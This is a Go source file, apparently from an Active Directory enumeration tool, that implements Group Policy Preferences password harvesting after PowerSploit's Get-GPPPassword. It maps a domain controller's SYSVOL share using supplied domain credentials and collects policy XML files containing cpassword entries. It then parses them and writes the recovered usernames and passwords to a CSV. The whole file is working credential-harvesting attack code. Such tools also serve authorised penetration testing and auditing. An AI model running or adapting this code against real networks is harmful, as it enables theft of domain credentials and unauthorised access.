// +build windows

package goddi

import (
	"fmt"
	"gopkg.in/ldap.v2"
	"log"
	"os"
	"os/exec"
)

// GetGPP grabs all GPP passwords
// Reference: Scott Sutherland (@_nullbind), Chris Campbell (@obscuresec)
// https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
func GetGPP(conn *ldap.Conn, domain string, dc string, user string, pass string) {

	fmt.Printf("[i] GPP enumeration starting. This can take a bit...\n")

	var filepaths = []string{
		`\Machine\Preferences\Groups\Groups.xml`,
		`\User\Preferences\Groups\Groups.xml`,
		`\Machine\Preferences\Services\Services.xml`,
		`\User\Preferences\Services\Services.xml`,
		`\Machine\Preferences\Scheduledtasks\Scheduledtasks.xml`,
		`\User\Preferences\Scheduledtasks\Scheduledtasks.xml`,
		`\Machine\Preferences\DataSources\DataSources.xml`,
		`\User\Preferences\DataSources\DataSources.xml`,
		`\Machine\Preferences\Printers\Printers.xml`,
		`\User\Preferences\Printers\Printers.xml`,
		`\Machine\Preferences\Drives\Drives.xml`,
		`\User\Preferences\Drives\Drives.xml`}

	attributes := []string{
		"filepath",
		"username",
		"cpassword",
		"password",
		"changed",
		"newname"}

	csv := [][]string{}
	csv = append(csv, attributes)
	letter := "Q:"
	drive := letter + `\`

	letter, drive = existsDrive(letter, drive)

	_, errr := mapDrive(letter, `\\`+dc+`\SYSVOL`, domain, user, pass)
	if errr != nil {
		log.Fatal(errr)
	}

	list := getSubDirs(drive)
	gpodomain := list[0]
	policypath := drive + gpodomain + `\Policies`

	var xmlfiles = []string{}

	policydirs := getSubDirs(policypath)
	for _, subdir := range policydirs {
		for _, path := range filepaths {
			fullpath := policypath + `\` + subdir + path
			if _, err := os.Stat(fullpath); !os.IsNotExist(err) && !os.IsPermission(err) {
				xmlfiles = append(xmlfiles, fullpath)
			}
		}
	}

	csvptr := &csv
	for _, file := range xmlfiles {
		parseXML(file, csvptr)
	}

	fmt.Printf("[i] GPP passwords: %d found\n", len(csv)-1)
	writeCSV("Domain_Passwords_GPP", csv)

	_, errs := removeDrive(letter)
	if errs != nil {
		log.Fatal(errs)
	}

}

// Helper function to check for a used drive and enumerate through available drives
func existsDrive(letter string, drive string) (string, string) {
	alpha := []string{"Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
		"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
		"N", "O", "P"}
	if _, err := os.Stat(drive); !os.IsNotExist(err) {
		for _, i := range alpha {
			letter = i + ":"
			drive = letter + `\`
			if _, err := os.Stat(drive); os.IsNotExist(err) {
				break
			}
		}
	}
	return letter, drive
}

// Map a drive
func mapDrive(letter string, address string, domain string, user string, pw string) ([]byte, error) {
	return exec.Command("net", "use", letter, address, fmt.Sprintf(`/user:%s\%s`, domain, user), pw, "/P:YES").CombinedOutput()
}

// Remove a drive
func removeDrive(letter string) ([]byte, error) {
	return exec.Command("net", "use", letter, "/delete").CombinedOutput()
}
